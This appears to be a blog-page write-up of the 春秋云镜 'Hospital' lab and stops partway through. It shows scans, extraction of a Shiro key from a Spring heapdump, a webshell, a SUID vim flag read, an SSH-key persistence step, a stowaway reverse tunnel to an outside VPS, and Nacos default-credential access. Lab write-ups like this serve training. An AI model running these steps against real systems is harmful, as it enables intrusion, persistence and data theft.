<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/OHpHdOLaUxipBf8itlPJy/_buildManifest.js" defer=""></script><script src="/_next/static/OHpHdOLaUxipBf8itlPJy/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"春秋云镜Hospital","contentHtml":"\u003ch1\u003eHospital\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://yunjing.ichunqiu.com/major/detail/1106?type=1\"\u003ehttps://yunjing.ichunqiu.com/major/detail/1106?type=1\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。\u003c/p\u003e\n\u003cp\u003e39.99.226.73\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/hospital  nmap -sT -min-rate 10000 -p- 39.99.226.73   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 02:33 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 39.99.226.73\nHost is up (0.013s latency).\nNot shown: 65531 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n25/tcp   open  smtp\n53/tcp   open  domain\n110/tcp  open  pop3\n8080/tcp open  http-proxy\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 19.94 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/hospital  nmap -sT -A -T4 -O -p 25,53,110,8080 39.99.226.73    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 02:34 EDT\nStats: 0:02:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 75.00% \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e; ETC: 02:37 (0:00:42 remaining)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 39.99.226.73\nHost is up (0.013s latency).\n\nPORT     STATE SERVICE    VERSION\n25/tcp   open  tcpwrapped\n|_smtp-commands: Couldn\u003cspan class=\"hljs-string\"\u003e't establish connection on port 25\n53/tcp   open  domain?\n110/tcp  open  tcpwrapped\n8080/tcp open  http-proxy\n| http-title: \\xE5\\x8C\\xBB\\xE7\\x96\\x97\\xE7\\xAE\\xA1\\xE7\\x90\\x86\\xE5\\x90\\x8E\\xE5\\x8F\\xB0\n|_Requested resource was http://39.99.226.73:8080/login;jsessionid=7D5532F970DC58645801CB456EF9C439\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=8658DE9BD5180DDE29E15CB1EA0CA3A3; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=8658DE9BD5180DDE29E15CB1EA0CA3A3\n|     Content-Length: 0\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=6282B5CD8CC24B824D0919FC37848D74; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=6282B5CD8CC24B824D0919FC37848D74\n|     Content-Length: 0\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|   HTTPOptions: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=003EEA4A0C76659AEFD8C6FF6B94D73B; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=003EEA4A0C76659AEFD8C6FF6B94D73B\n|     Content-Length: 0\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|   RTSPRequest: \n|     HTTP/1.1 505 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 465\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     \u0026#x3C;!doctype html\u003e\u0026#x3C;html lang=\"en\"\u003e\u0026#x3C;head\u003e\u0026#x3C;title\u003eHTTP Status 505 \n|     HTTP Version Not Supported\u0026#x3C;/title\u003e\u0026#x3C;style type=\"text/css\"\u003ebody {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026#x3C;/style\u003e\u0026#x3C;/head\u003e\u0026#x3C;body\u003e\u0026#x3C;h1\u003eHTTP Status 505 \n|     HTTP Version Not Supported\u0026#x3C;/h1\u003e\u0026#x3C;/body\u003e\u0026#x3C;/html\u003e\n|   Socks5: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|     \u0026#x3C;!doctype html\u003e\u0026#x3C;html lang=\"en\"\u003e\u0026#x3C;head\u003e\u0026#x3C;title\u003eHTTP Status 400 \n|     Request\u0026#x3C;/title\u003e\u0026#x3C;style type=\"text/css\"\u003ebody {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026#x3C;/style\u003e\u0026#x3C;/head\u003e\u0026#x3C;body\u003e\u0026#x3C;h1\u003eHTTP Status 400 \n|_    Request\u0026#x3C;/h1\u003e\u0026#x3C;/body\u003e\u0026#x3C;/html\u003e\n|_http-trane-info: Problem with XML parsing of /evox/about\n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: WAP\nRunning: Actiontec embedded, Linux\nOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel\nOS details: Actiontec MI424WR-GEN3I WAP\nNetwork Distance: 16 hops\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 186.32 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003efscan\u003c/code\u003e 扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/Tools  ./fscan_1.8.4 -h 39.99.226.73 \n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n39.99.226.73:8080 open\n[*] alive ports len is: 1\nstart vulscan\n[*] WebTitle http://39.99.226.73:8080  code:302 len:0      title:None 跳转url: http://39.99.226.73:8080/login;jsessionid=637A12B5B7D04CD31B9B6DB1939CC093\n[*] WebTitle http://39.99.226.73:8080/login;jsessionid=637A12B5B7D04CD31B9B6DB1939CC093 code:200 len:2005   title:医疗管理后台\n[+] PocScan http://39.99.226.73:8080 poc-yaml-spring-actuator-heapdump-file \n已完成 1/1\n[*] 扫描结束,耗时: 20.152215581s\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003espring-actuator-heapdump-file\u003c/h3\u003e\n\u003cp\u003e发现存在 \u003ccode\u003espring-actuator-heapdump-file\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e那么就将\u003ccode\u003eheapdump\u003c/code\u003e 文件下载下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/hospital  wget http://39.99.226.73:8080/actuator/heapdump                                  \n--2025-04-10 02:49:29--  http://39.99.226.73:8080/actuator/heapdump\n正在连接 39.99.226.73:8080... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 \n长度：29135811 (28M) [application/octet-stream]\n正在保存至: “heapdump”\n\nheapdump                                                 100%[==================================================================================================================================\u003e]  27.79M  1.20MB/s  用时 20s     \n\n2025-04-10 02:49:49 (1.41 MB/s) - 已保存 “heapdump” [29135811/29135811])\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eJDumpSpider\u003c/code\u003e来读取敏感信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/hospital  java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump     \n.....\n===========================================                                                                                                                                                                                         \nCookieRememberMeManager(ShiroKey)                                                                                                                                                                                                   \n-------------                                                                                                     \nalgMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES                                                                                                                                                                        \n                                                                                                                  \n===========================================          \n.....\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eShiro 漏洞利用\u003c/h3\u003e\n\u003cp\u003e读到了\u003ccode\u003eShiro\u003c/code\u003e的\u003ccode\u003ekey\u003c/code\u003e，想验证一下是否存在\u003ccode\u003eShiro\u003c/code\u003e漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e存在，直接梭哈\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e冰蝎连接成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e172.30.12.5\u003c/h2\u003e\n\u003ch3\u003eSUID 提权\u003c/h3\u003e\n\u003cp\u003e将 \u003ccode\u003eShell\u003c/code\u003e 弹到VPS上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython3 -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/bash')\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到\u003ccode\u003eshell\u003c/code\u003e第一时间写入公钥，方便后面登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa xxxxxx\"\u003c/span\u003e \u003e .ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e寻找是否存在 \u003ccode\u003eSUID\u003c/code\u003e 权限的可执行文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efind / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/usr/bin/vim.basic\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/stapbpf\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现可以\u003ccode\u003evim\u003c/code\u003e拥有SUID，因为 flag不在根目录，所以就应该在 root下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evim /root/flag/flag01.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eO))     O))                              O))             O))\nO))     O))                          O)  O))             O))\nO))     O))   O))     O)))) O) O))     O)O) O)   O))     O))\nO)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))\nO))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))\nO))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))\nO))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))\n                            O))\nflag01: flag{c5271ec6-872c-4bc6-ab91-dd6651b9caad}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e搭建代理\u003c/h3\u003e\n\u003cp\u003e首先查看一手内网\u003ccode\u003eIP\u003c/code\u003e ，内网网段\u003ccode\u003e172.30.12.x\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:16:3e:05:a2:90 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315357620sec preferred_lft 315357620sec\n    inet6 fe80::216:3eff:fe05:a290/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003estowaway\u003c/code\u003e来搭建代理，靶机上传\u003ccode\u003estowaway\u003c/code\u003e 客户端\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// VPS \n./linux_x64_admin -l 8080 -s 123123\n// 靶机\n./linux_x64_agent -c 8.134.163.255:8080 -s 123123 -reconnect 8 \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e连上后，在服务端操作开\u003ccode\u003esocks\u003c/code\u003e代理\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(admin) \u003e\u003e detail\nNode[0] -\u003e IP: 39.99.226.73:52592  Hostname: web01  User: app\nMemo: \n\n(admin) \u003e\u003e use 0\n\n(node 0) \u003e\u003e socks 2096 admin 123456\n[*] Trying to listen on 0.0.0.0:2096......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Socks start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行测试，Kali上使用\u003ccode\u003eproxychains4\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003evim /etc/proxychains4.conf\nsocks5  8.134.163.255   2096    admin   123456\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/hospital  proxychains curl 172.30.12.5:8080/login                                 \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            \n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  8.134.163.255:2096  ...  172.30.12.5:8080  ...  OK                               \n\u0026#x3C;!DOCTYPE html\u003e                                          \n\u0026#x3C;html\u003e                                     \n\u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e\u003e          \n    \u0026#x3C;title\u003e医疗管理后台\u0026#x3C;/title\u003e\n   ......\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e内网探测\u003c/h3\u003e\n\u003cp\u003e上传 \u003ccode\u003efscan\u003c/code\u003e进行内网网段\u003ccode\u003e172.30.12.x\u003c/code\u003e扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003estart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.30.12.5     is alive\n(icmp) Target 172.30.12.6     is alive\n(icmp) Target 172.30.12.236   is alive\n[*] Icmp alive hosts len is: 3\n172.30.12.6:139 open\n172.30.12.6:135 open\n172.30.12.236:22 open\n172.30.12.5:22 open\n172.30.12.236:8080 open\n172.30.12.5:8080 open\n172.30.12.6:8848 open\n172.30.12.236:8009 open\n172.30.12.6:445 open\n[*] alive ports len is: 9\nstart vulscan\n[*] NetBios 172.30.12.6     WORKGROUP\\SERVER02            \n[*] NetInfo \n[*]172.30.12.6\n   [-\u003e]Server02\n   [-\u003e]172.30.12.6\n[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台\n[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found\n[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=B1295058310914FB008CE8E49BF23E4F\n[*] WebTitle http://172.30.12.5:8080/login;jsessionid=B1295058310914FB008CE8E49BF23E4F code:200 len:2005   title:医疗管理后台\n[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos \n[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass \n[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e172.30.12.6\u003c/h2\u003e\n\u003ch3\u003eNacos 漏洞探测\u003c/h3\u003e\n\u003cp\u003e直接用工具进行检测\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用用户\u003ccode\u003enacos:nacos\u003c/code\u003e进行登录，成功进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用工具注入内存马，但是连接不成功，后面尝试了哥斯拉的也一样\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eNacos Client Yaml 反序列化\u003c/h3\u003e\n\u003cp\u003e那么还可以尝试 Nacos Client Yaml 反序列化漏洞\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#nacos-client-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"\u003ehttps://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#nacos-client-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e工具链接：\u003ca href=\"https://github.com/artsploit/yaml-payload\"\u003ehttps://github.com/artsploit/yaml-payload\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e下载之后打包成 \u003ccode\u003ejar\u003c/code\u003e 包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/hospital  /usr/local/jdk1.8.0_202/bin/javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n ⚡ root@kali  ~/Desktop/test/hospital  jar -cvf yaml-payload.jar -C yaml-payload/src/ .\nadding: META-INF/ (\u003cspan 